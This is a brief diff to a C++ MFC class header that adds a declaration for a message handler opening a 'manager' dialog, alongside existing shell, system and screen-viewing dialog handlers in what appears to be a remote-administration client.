@@ -83,6 +83,8 @@ private:
 	afx_msg LRESULT OnOpenShellDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
+	afx_msg LRESULT OnOpenManagerDialog(WPARAM wParam, LPARAM lParam);
+
 public:
 	void SendSelectCommand(PBYTE pData, UINT nSize);
 
